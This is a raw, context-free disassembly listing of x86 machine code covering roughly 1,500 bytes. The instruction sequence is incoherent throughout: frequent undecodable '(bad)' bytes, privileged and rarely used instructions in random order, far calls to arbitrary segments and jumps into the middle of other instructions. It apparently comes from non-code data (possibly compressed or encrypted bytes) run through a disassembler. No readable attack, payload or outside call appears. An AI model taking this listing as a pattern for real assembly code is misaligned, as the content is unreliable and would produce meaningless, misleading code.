  427d20:	adc    ch,BYTE PTR [ebx]
  427d22:	pop    eax
  427d23:	push   edi
  427d24:	cdq    
  427d25:	adc    dh,BYTE PTR [eax]
  427d27:	ja     0x427d3a
  427d29:	mov    esi,0x4c635f65
  427d2e:	aam    0x45
  427d30:	icebp  
  427d31:	xchg   ebx,eax
  427d32:	adc    BYTE PTR [edx],bl
  427d34:	xchg   BYTE PTR ds:0x5c7c5765,bl
  427d3a:	and    ebx,DWORD PTR [ebx]
  427d3c:	mov    esi,0x1263cece
  427d41:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  427d42:	pop    ecx
  427d43:	gs das 
  427d45:	sbb    al,0xb
  427d47:	pusha  
  427d48:	(bad)  
  427d49:	cmp    ecx,ecx
  427d4b:	push   0xffffff9b
  427d4d:	mov    ah,0xaf
  427d4f:	mov    bh,0xec
  427d51:	dec    edi
  427d53:	add    eax,0xc563f3bd
  427d58:	imul   ebp,DWORD PTR [ecx-0x4712fa70],0xffffffe5
  427d5f:	in     al,dx
  427d60:	fucomi st,st(1)
  427d62:	(bad)  
  427d63:	cdq    
  427d64:	lds    edx,FWORD PTR [ecx+0x16b6f44c]
  427d6a:	loopne 0x427cf5
  427d6c:	mov    ds:0x855a39b4,eax
  427d71:	lods   al,BYTE PTR ds:[esi]
  427d72:	std    
  427d73:	stos   DWORD PTR es:[edi],eax
  427d74:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  427d75:	sbb    esi,DWORD PTR [edx]
  427d77:	cmp    BYTE PTR [eax],bh
  427d79:	and    cl,dl
  427d7b:	ror    DWORD PTR fs:[ebp+eiz*4-0x18],cl
  427d80:	loope  0x427df3
  427d82:	xor    ch,BYTE PTR [eax+0x3c]
  427d85:	lods   al,BYTE PTR ds:[esi]
  427d86:	fisttp QWORD PTR [ecx-0x48]
  427d89:	lds    ebx,FWORD PTR [eax]
  427d8b:	push   cs
  427d8c:	into   
  427d8d:	dec    eax
  427d8e:	inc    esp
  427d8f:	ret    0x4560
  427d92:	test   al,0xcc
  427d94:	sub    esi,DWORD PTR [ebx]
  427d96:	xchg   edx,eax
  427d97:	pop    edi
  427d98:	sysret 
  427d9a:	lods   eax,DWORD PTR ds:[esi]
  427d9b:	repnz (bad) 
  427d9d:	dec    edx
  427d9e:	stos   DWORD PTR es:[edi],eax
  427d9f:	sub    eax,0xabe97a58
  427da4:	xor    al,0x66
  427da6:	or     al,0xe7
  427da8:	ins    BYTE PTR es:[edi],dx
  427da9:	(bad)  
  427daa:	dec    ecx
  427dab:	mov    ah,0x6a
  427dad:	xchg   esi,eax
  427dae:	dec    BYTE PTR [esi+ecx*1]
  427db1:	mov    dl,0x65
  427db3:	stc    
  427db4:	sub    al,0xe0
  427db6:	je     0x427dce
  427db8:	sbb    edi,edx
  427dba:	xor    DWORD PTR fs:0x83b7e717,edi
  427dc1:	daa    
  427dc2:	jne    0x427d78
  427dc4:	sub    ebp,0x5efc5fd5
  427dca:	repnz test DWORD PTR [ecx+0x7d],0x255b5a87
  427dd2:	xchg   edx,eax
  427dd3:	shl    DWORD PTR [ebp-0x33f1bab],0xde
  427dda:	ret    0xc010
  427ddd:	pushf  
  427dde:	and    al,0xdb
  427de0:	push   es
  427de1:	in     eax,dx
  427de2:	inc    ebp
  427de3:	dec    ebp
  427de4:	pop    esp
  427de5:	loopne 0x427e0b
  427de7:	pop    ss
  427de8:	(bad)  
  427de9:	cmp    DWORD PTR [eax],eax
  427deb:	or     al,BYTE PTR [ecx]
  427ded:	(bad)
  427df0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  427df1:	cmp    edx,ebx
  427df3:	mov    ebx,DWORD PTR [edx]
  427df5:	aad    0x32
  427df7:	dec    eax
  427df8:	mov    fs,WORD PTR [esi+0x3bf2e503]
  427dfe:	and    dl,ch
  427e00:	repz cli 
  427e02:	test   eax,0x155ec241
  427e07:	xor    ebx,DWORD PTR [ebx+eax*2-0xd]
  427e0b:	mov    ds:0xb922ce40,eax
  427e10:	loopne 0x427e3e
  427e12:	loope  0x427dbd
  427e14:	aaa    
  427e15:	push   ecx
  427e16:	cwde   
  427e17:	fwait
  427e18:	test   BYTE PTR [edx-0x80],ch
  427e1b:	push   ds
  427e1c:	mov    BYTE PTR [eax+0x4b],dl
  427e1f:	xchg   esi,eax
  427e20:	cs mov dl,0xd0
  427e23:	adc    eax,0xd8c00e2c
  427e28:	lods   eax,DWORD PTR ds:[esi]
  427e29:	aam    0x91
  427e2b:	loope  0x427e34
  427e2d:	dec    ebx
  427e2e:	jl     0x427ddb
  427e30:	cmp    al,0x72
  427e32:	(bad)  
  427e33:	cwde   
  427e34:	xchg   edx,eax
  427e35:	inc    ebp
  427e36:	test   DWORD PTR [eax+0x15891fe3],esi
  427e3c:	popf   
  427e3d:	shl    BYTE PTR [ebx+edx*4],cl
  427e40:	add    BYTE PTR [ebp+0x6d832715],bl
  427e46:	push   esp
  427e47:	sub    DWORD PTR [edx+0x3b158c29],esi
  427e4d:	sub    al,0x95
  427e4f:	dec    edx
  427e50:	xchg   edx,eax
  427e51:	es (bad) 
  427e53:	and    dh,BYTE PTR [ebx]
  427e55:	or     BYTE PTR [eax],al
  427e57:	pop    edi
  427e58:	dec    ebx
  427e59:	and    DWORD PTR [edi+0x2e1cd4be],esi
  427e5f:	jg     0x427e23
  427e61:	pop    ds
  427e62:	or     bl,ah
  427e64:	push   edi
  427e65:	xchg   esi,eax
  427e66:	push   esi
  427e67:	inc    esi
  427e68:	(bad)  
  427e69:	std    
  427e6a:	sub    eax,0xb1c46c9e
  427e6f:	push   0xbf292f98
  427e74:	xchg   edi,eax
  427e75:	jp     0x427e2d
  427e77:	in     al,0xe2
  427e79:	pop    edx
  427e7a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  427e7b:	out    0xb2,al
  427e7d:	dec    ebp
  427e7e:	or     al,0x49
  427e80:	jne    0x427ec1
  427e82:	ds inc esp
  427e84:	test   eax,0x633575c9
  427e89:	call   0x5915:0xb5958c06
  427e90:	xor    BYTE PTR [eax],bh
  427e92:	xchg   ebp,eax
  427e93:	ror    BYTE PTR [ecx+0x3db4c6a6],cl
  427e99:	gs pop eax
  427e9b:	(bad)  
  427e9c:	daa    
  427e9d:	adc    eax,0x2c599a24
  427ea2:	cli    
  427ea3:	mov    edi,0xbef3d228
  427ea8:	push   edx
  427ea9:	stos   BYTE PTR es:[edi],al
  427eaa:	pop    edx
  427eab:	repnz push 0xe0d1748f
  427eb1:	cmp    bh,0x4f
  427eb4:	ret    0x58d5
  427eb7:	loope  0x427f31
  427eb9:	xchg   edx,eax
  427eba:	push   ebx
  427ebb:	stos   DWORD PTR es:[edi],eax
  427ebc:	scas   al,BYTE PTR es:[edi]
  427ebd:	jns    0x427e5a
  427ebf:	mul    DWORD PTR [ebp+0x74e69345]
  427ec5:	push   edx
  427ec6:	jbe    0x427ef9
  427ec8:	dec    ebp
  427ec9:	mov    esp,0x6b0ebe7b
  427ece:	push   esi
  427ecf:	lods   al,BYTE PTR ds:[esi]
  427ed0:	mov    ch,0x81
  427ed2:	lock pop esp
  427ed4:	aas    
  427ed5:	les    edx,FWORD PTR [edx+edi*8]
  427ed8:	add    ch,0x83
  427edb:	lock mov esp,0x46c5006f
  427ee1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  427ee2:	xchg   ebx,eax
  427ee3:	mov    edx,0xf26d0b1d
  427ee8:	adc    BYTE PTR [ecx-0x67],ch
  427eeb:	(bad)  
  427eec:	lods   al,BYTE PTR ds:[esi]
  427eed:	es ja  0x427ecc
  427ef0:	add    cl,BYTE PTR [ebp+0x74]
  427ef3:	push   eax
  427ef4:	jno    0x427f65
  427ef6:	fist   WORD PTR [esi+0x193c8709]
  427efc:	xchg   esi,eax
  427efd:	sbb    eax,0xe808708
  427f02:	stos   DWORD PTR es:[edi],eax
  427f03:	adc    edi,DWORD PTR [edi+edi*4-0x7aa3ccb3]
  427f0a:	jmp    0xb4ead400
  427f0f:	shl    DWORD PTR ds:0x83f21e13,0x1
  427f16:	pop    ss
  427f17:	push   0xbef80d83
  427f1c:	sub    BYTE PTR [edi-0xc351cbf],ch
  427f22:	mov    al,0xbd
  427f24:	add    al,0xa4
  427f26:	fisttp WORD PTR [ecx+0x783e74da]
  427f2c:	jl     0x427f3e
  427f2e:	xchg   DWORD PTR [esi],edx
  427f30:	xor    DWORD PTR [edi+0x17],0xffffff93
  427f34:	adc    DWORD PTR [edi+ebx*2+0x3dcdcf4e],ebx
  427f3b:	push   ebx
  427f3c:	in     eax,dx
  427f3d:	pop    ss
  427f3e:	cwde   
  427f3f:	hlt    
  427f40:	jecxz  0x427f96
  427f42:	imul   ebp,DWORD PTR [eax-0xed9010f],0xfffffff6
  427f49:	mov    al,ds:0x8e8feda3
  427f4e:	out    dx,eax
  427f4f:	push   0xa3eb256a
	...
  427f60:	add    BYTE PTR [ebx+ecx*4-0x2000283b],dh
  427f67:	mov    dh,0xeb
  427f69:	xor    BYTE PTR [eax-0x2621441f],ch
  427f6f:	test   eax,0x1f4cee0
  427f74:	add    BYTE PTR [edi+0x17000003],ah
  427f7a:	xchg   ebp,eax
  427f7b:	pop    edx
  427f7c:	inc    ebp
  427f7d:	push   eax
  427f7e:	jl     0x427fea
  427f80:	pop    ecx
  427f81:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  427f82:	cdq    
  427f83:	cmp    dh,0x7a
  427f86:	mov    al,ds:0xd796b021
  427f8b:	mov    ecx,0x7fcbce45
  427f90:	cmp    al,BYTE PTR [edx+0x39]
  427f93:	jmp    0xcc403707
  427f98:	call   0x648a:0x5ebf7ebd
  427f9f:	add    eax,0x3e0d8a4a
  427fa4:	ins    DWORD PTR es:[edi],dx
  427fa5:	cmp    al,0x80
  427fa7:	jne    0x427f68
  427fa9:	mov    ss:0xc984b9c,eax
  427faf:	add    ah,BYTE PTR [edi-0x16f3cde7]
  427fb5:	mov    eax,ds:0xfd247de7
  427fba:	into   
  427fbb:	mov    esi,0x601b294b
  427fc0:	adc    BYTE PTR [esi-0x7c],dh
  427fc3:	int3   
  427fc4:	xchg   DWORD PTR fs:[ebp+0x4c],edx
  427fc8:	or     ch,BYTE PTR [esi+0x2b]
  427fcb:	sub    ebx,0xc877d8f2
  427fd1:	push   ss
  427fd2:	into   
  427fd3:	mov    cl,0x66
  427fd5:	cmovno esp,DWORD PTR [edx-0x76a40dd5]
  427fdc:	sub    eax,0x9b0ad09d
  427fe1:	lahf   
  427fe2:	mov    WORD PTR [ecx+0x7e],fs
  427fe5:	push   0x47c464c
  427fea:	inc    ebx
  427feb:	jnp    0x428028
  427fed:	mov    ah,0x40
  427fef:	leave  
  427ff0:	pop    edi
  427ff1:	jbe    0x42805c
  427ff3:	or     esp,DWORD PTR [edx]
  427ff5:	pop    edi
  427ff6:	bound  esp,QWORD PTR [edi]
  427ff8:	pop    ds
  427ff9:	fcos   
  427ffb:	lahf   
  427ffc:	xchg   esi,eax
  427ffd:	jl     0x428073
  427fff:	jbe    0x428069
  428001:	xor    eax,eax
  428003:	xchg   DWORD PTR [edx],esp
  428005:	or     DWORD PTR [ecx-0x3a],ecx
  428008:	ror    ecx,1
  42800a:	sub    DWORD PTR [edx+edi*4-0x9ffc67b],0x9fe7be5
  428015:	mov    ah,0x58
  428017:	in     eax,dx
  428018:	xchg   ebp,eax
  428019:	dec    esp
  42801a:	sub    al,0xdf
  42801c:	and    eax,0xa199764a
  428021:	mov    al,0x8
  428023:	dec    ecx
  428024:	aas    
  428025:	cs or  eax,0xbd6557e7
  42802b:	test   dh,dh
  42802d:	inc    eax
  42802e:	scas   eax,DWORD PTR es:[edi]
  42802f:	ja     0x427ffb
  428031:	pop    ecx
  428032:	ja     0x4280a6
  428034:	ja     0x428017
  428036:	sub    dl,BYTE PTR [ecx+esi*8+0x4e]
  42803a:	out    0x96,al
  42803c:	mov    ebp,0x3f2513d7
  428041:	dec    ebp
  428042:	loope  0x42807f
  428044:	(bad)
  428047:	in     eax,dx
  428048:	jo     0x428004
  42804a:	pop    esp
  42804b:	ja     0x4280b9
  42804d:	adc    esi,eax
  42804f:	mov    ch,0xb1
  428051:	lahf   
  428052:	add    al,0xc7
  428054:	test   al,0x7a
  428056:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  428057:	ret    
  428058:	jbe    0x4280a9
  42805a:	sbb    al,0xad
  42805c:	sbb    esp,edi
  42805e:	xor    al,0x9f
  428060:	push   ecx
  428061:	into   
  428062:	push   0xffffffe4
  428064:	leave  
  428065:	sub    ch,ch
  428067:	scas   al,BYTE PTR es:[edi]
  428068:	loop   0x428009
  42806a:	icebp  
  42806b:	(bad)  
  42806c:	or     eax,0xcf4d6a69
  428071:	mov    ecx,0xad7c619f
  428076:	add    al,0xba
  428078:	xchg   esp,eax
  428079:	stos   DWORD PTR es:[edi],eax
  42807a:	ds cmc 
  42807c:	inc    BYTE PTR [ecx+edx*1]
  42807f:	cdq    
  428080:	push   ebx
  428081:	inc    edi
  428082:	xchg   esp,eax
  428083:	addr16 dec ecx
  428085:	aam    0x91
  428087:	mov    al,0x1e
  428089:	arpl   bx,di
  42808b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42808c:	push   edi
  42808d:	test   BYTE PTR [eax-0x35],bh
  428090:	dec    ebx
  428091:	mov    WORD PTR [ecx-0xaa77105],?
  428097:	jl     0x42806c
  428099:	fcomp  DWORD PTR [ecx+0x76]
  42809c:	xchg   BYTE PTR [ebp+0x45],dl
  42809f:	adc    esi,esp
  4280a1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4280a2:	sub    edi,DWORD PTR es:[edi+edx*1-0x15e5dd14]
  4280aa:	mov    bl,0x7f
  4280ac:	retf   
  4280ad:	cmp    BYTE PTR [esi+0x47],0xf3
  4280b1:	sbb    al,0x5
  4280b3:	call   0x54d4:0xbb7e2f61
  4280ba:	fidiv  WORD PTR [ecx-0x41]
  4280bd:	mov    WORD PTR [esi-0xb],?
  4280c0:	xchg   esp,eax
  4280c1:	test   edx,eax
  4280c3:	mov    bh,0x20
  4280c5:	ret    0x3a9d
  4280c8:	out    dx,al
  4280c9:	sbb    esp,ebx
  4280cb:	inc    esi
  4280cc:	xor    esi,DWORD PTR [edi-0x1b1145f3]
  4280d2:	ja     0x4280a7
  4280d4:	jne    0x4280c0
  4280d6:	test   edi,ebx
  4280d8:	xor    dl,ch
  4280da:	or     eax,0xb62f1cc5
  4280df:	sub    al,0x19
  4280e1:	sbb    DWORD PTR [esi-0x671dd9a5],0xbc626bbf
  4280eb:	pushf  
  4280ec:	les    eax,FWORD PTR [esi]
  4280ee:	nop
  4280ef:	jmp    ebp
  4280f1:	inc    eax
  4280f2:	arpl   WORD PTR [edx-0x57],si
  4280f5:	aad    0x9b
  4280f7:	push   0x72da451
  4280fc:	mov    edi,0x441a69de
  428101:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  428102:	(bad)  
  428104:	ja     0x428157
  428106:	pop    ecx
  428107:	inc    ebp
  428108:	mov    al,ds:0xe6384a41
  42810d:	fcmovne st,st(7)
  42810f:	leave  
  428110:	and    al,0xe
  428112:	sub    eax,0xca131c87
  428117:	xchg   edx,eax
  428118:	(bad)  
  428119:	xlat   BYTE PTR ds:[ebx]
  42811a:	out    dx,eax
  42811b:	ja     0x428112
  42811d:	fidivr WORD PTR ds:0x10ac3593
  428123:	mov    ch,0xec
  428125:	rcr    ebp,cl
  428127:	push   esi
  428128:	mov    ecx,0xddaf73d
  42812d:	aad    0x1c
  42812f:	std    
  428130:	repnz inc esp
  428132:	add    al,0x59
  428134:	mov    BYTE PTR [eax-0x47],dl
  428137:	or     cl,BYTE PTR [ecx+eax*4-0x7e]
  42813b:	out    dx,al
  42813c:	mov    dh,0xd0
  42813e:	xchg   ebx,eax
  42813f:	addr16 mov ds:0xd8c6,eax
  428143:	je     0x4281a1
  428145:	mov    ah,ch
  428147:	dec    ecx
  428148:	imul   eax,DWORD PTR [esi-0xdd2b49d],0xffffffa6
  42814f:	shr    BYTE PTR [ebx-0x486adf6e],cl
  428155:	repz lock xchg esi,eax
  428158:	dec    edi
  428159:	repz mov esi,0x30de80be
  42815f:	push   0x58
  428161:	es das 
  428163:	mov    cl,0x64
  428165:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  428166:	jmp    0x62503a1d
  42816b:	jns    0x42819a
  42816d:	daa    
  42816e:	mov    dh,0x1c
  428170:	cs cmc 
  428172:	(bad)  
  428173:	nop
  428174:	loopne 0x428190
  428176:	in     al,dx
  428177:	shl    cl,0xaf
  42817a:	mov    dh,0xfe
  42817c:	js     0x428103
  42817e:	loope  0x4281d5
  428180:	sti    
  428181:	sub    al,0xbe
  428183:	in     al,dx
  428184:	mov    ebp,0x82d65379
  428189:	sub    ebx,DWORD PTR [edi+0x22]
  42818c:	mov    dh,0x93
  42818e:	lods   al,BYTE PTR ds:[esi]
  42818f:	push   edx
  428190:	popa   
  428191:	loop   0x4281ba
  428193:	lods   eax,DWORD PTR ds:[esi]
  428194:	scas   eax,DWORD PTR es:[edi]
  428195:	ret    
  428196:	lea    eax,[esi-0x4f]
  428199:	mov    ah,0xa9
  42819b:	pop    ds
  42819c:	xlat   BYTE PTR ds:[ebx]
  42819d:	mov    esp,0xe036b317
  4281a2:	adc    edx,DWORD PTR [esi-0x6e]
  4281a5:	outs   dx,BYTE PTR ds:[esi]
  4281a6:	mov    ch,0x7e
  4281a8:	outs   dx,BYTE PTR ds:[esi]
  4281a9:	dec    ebx
  4281aa:	rcr    DWORD PTR ds:0x7fd24df5,1
  4281b0:	lahf   
  4281b1:	and    edx,DWORD PTR [edi+0x4397a364]
  4281b7:	popa   
  4281b8:	xchg   BYTE PTR [ecx-0x13],al
  4281bb:	shl    bl,1
  4281bd:	jecxz  0x42816e
  4281bf:	pushf  
  4281c0:	cmp    dh,BYTE PTR [ecx]
  4281c2:	fidivr DWORD PTR [ebx-0x75]
  4281c5:	dec    ecx
  4281c6:	cdq    
  4281c7:	(bad)  
  4281c8:	aad    0x51
  4281ca:	outs   dx,BYTE PTR ds:[esi]
  4281cb:	fdivr  QWORD PTR [edx+0x7a]
  4281ce:	jp     0x4281c7
  4281d0:	or     dh,BYTE PTR [edi+0x6e]
  4281d3:	mov    ah,0xd3
  4281d5:	rol    ebp,cl
  4281d7:	push   ecx
  4281d8:	or     al,0x91
  4281da:	and    WORD PTR [esi-0x23e4460],sp
  4281e1:	fild   WORD PTR [ecx-0x7]
  4281e4:	inc    ebp
  4281e5:	pop    ds
  4281e6:	retf   0x5c4e
  4281e9:	pop    esp
  4281ea:	push   edx
  4281eb:	add    BYTE PTR [edx],al
  4281ed:	into   
  4281ee:	push   ss
  4281ef:	inc    ecx
  4281f0:	in     al,0x8f
  4281f2:	pop    esp
  4281f3:	sahf   
  4281f4:	shl    BYTE PTR [ebx+0x26],cl
  4281f7:	shl    edi,0x76
  4281fa:	push   esi
  4281fb:	aas    
  4281fc:	cmp    eax,0xb8a1febd
  428201:	fs and eax,0x2a51a1e4
  428207:	btr    esp,esi
  42820a:	sbb    bl,BYTE PTR [ebx-0x4a9b5b22]
  428210:	aam    0x27
  428212:	je     0x4281dd
  428214:	in     al,dx
  428215:	nop
  428216:	push   0x8a96d963
  42821b:	jl     0xb231c749
  428221:	add    eax,0x2b232544
  428226:	das    
  428227:	cdq    
  428228:	fstp   DWORD PTR [eax-0x67]
  42822b:	cld    
  42822c:	test   BYTE PTR [ebx],al
  42822e:	dec    edx
  42822f:	jle    0x42827a
  428231:	mov    dh,BYTE PTR [ebx+ecx*2-0x6b]
  428235:	mov    esp,0xf0adb30c
  42823a:	add    ch,ch
  42823c:	adc    al,0x48
  42823e:	adc    eax,0x78135ba0
  428243:	cwde   
  428244:	dec    eax
  428245:	jno    0x4282a2
  428247:	jp     0x4281c9
  428249:	or     esi,eax
  42824b:	call   0x9c2b:0xbb15dd19
  428252:	mov    ebx,0x297fbba0
  428257:	into   
  428258:	(bad)  
  428259:	push   ebx
  42825a:	dec    ebx
  42825b:	add    DWORD PTR [esi+0x24b93c56],0x3d
  428262:	cs aam 0x75
  428265:	int    0x19
  428267:	or     eax,0x2c6d10f7
  42826c:	xchg   esi,eax
  42826d:	xchg   BYTE PTR [ecx+edx*1],dl
  428270:	xlat   BYTE PTR ds:[ebx]
  428271:	bound  eax,QWORD PTR [esi]
  428273:	pop    esp
  428274:	fsubr  DWORD PTR [esi-0x21cb1198]
  42827a:	or     BYTE PTR [ecx+0x47dacdac],dh
  428280:	ins    DWORD PTR es:[edi],dx
  428281:	fs repz or al,0x2c
  428285:	mov    BYTE PTR [edi],al
  428287:	ror    ch,0x4f
  42828a:	mov    DWORD PTR [ebp+0x49],ebp
  42828d:	mov    ds:0x9db7e10f,eax
  428292:	cmp    DWORD PTR [edx],edx
  428294:	outs   dx,BYTE PTR ds:[esi]
  428295:	lahf   
  428296:	cld    
  428297:	int3   
  428298:	xchg   DWORD PTR [edi],ecx
  42829a:	cmp    eax,0x6f5fd81e
  42829f:	cwde   
  4282a0:	stc    
  4282a1:	sar    DWORD PTR [ebx-0x137ed6ad],1
  4282a7:	adc    edi,esp
  4282a9:	pop    ss
  4282aa:	ss sbb ebx,ebx
  4282ad:	lahf   
  4282ae:	shl    DWORD PTR [ecx+eax*4],1
  4282b1:	dec    ecx
  4282b2:	and    DWORD PTR [eax-0x22da0b5a],esp
  4282b8:	and    eax,0x82586282
  4282bd:	data16 test al,0xf3
  4282c0:	inc    edi
  4282c1:	adc    BYTE PTR [ebx-0x4e],bl
  4282c4:	push   ebx
  4282c5:	pushf  
  4282c6:	sub    DWORD PTR ds:0xbda4062d,ecx
  4282cc:	cld    
  4282cd:	push   ds
  4282ce:	or     BYTE PTR [ecx+ecx*1-0x74],bl
  4282d2:	sub    eax,0x34353979
  4282d7:	pop    esp
  4282d8:	sbb    DWORD PTR ds:0xfdde9e63,esi
  4282de:	outs   dx,DWORD PTR ds:[esi]
  4282df:	add    al,0xe3
  4282e1:	enter  0x2514,0x95
  4282e5:	addr16 push ds
  4282e7:	stc    
  4282e8:	gs cdq 
  4282ea:	add    eax,0xf0ac5456
  4282ef:	mov    esp,0x39dfe08c
  4282f4:	addr16 cli 
  4282f6:	inc    edi
  4282f7:	jb     0x428358
  4282f9:	cdq    
  4282fa:	mov    dl,0x38
  4282fc:	sbb    eax,0xec5f7c59
  428301:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  428302:	mov    WORD PTR [esi],es
  428304:	xchg   esp,eax
  428305:	in     al,0x77
  428307:	aam    0xc
  428309:	dec    edx
  42830a:	mov    ds:0x185b74d9,eax
  42830f:	pop    ss
  428310:	inc    esp
  428311:	push   esi
  428312:	mov    ebp,0x82177123
  428317:	div    DWORD PTR [ebx]
  428319:	pop    esp
  42831a:	push   ebx
  42831b:	repz cli 
  42831d:	repnz add al,0x15
	...
